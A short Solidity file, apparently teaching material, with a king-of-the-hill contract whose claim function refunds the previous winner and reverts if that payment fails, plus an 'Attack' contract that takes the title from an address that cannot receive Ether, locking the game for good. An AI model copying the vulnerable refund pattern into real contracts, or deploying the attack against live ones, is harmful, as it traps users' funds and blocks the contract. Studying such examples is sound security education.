pragma solidity ^0.8.13;

contract WinnerOfEther {
    address public winner;
    uint public balance;

    function claimContract() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        (bool sent, ) = winner.call{value: balance}("");
        require(sent, "Failed to send Ether");

        balance = msg.value;
        winner = msg.sender;
    }
}

contract Attack {
    WinnerOfEther winnerOfEther;

    constructor(WinnerOfEther _winnerOfEther) {
        winnerOfEther = WinnerOfEther(_winnerOfEther);
    }

    function attack() public payable {
        winnerOfEther.claimContract{value: msg.value}();
    }
}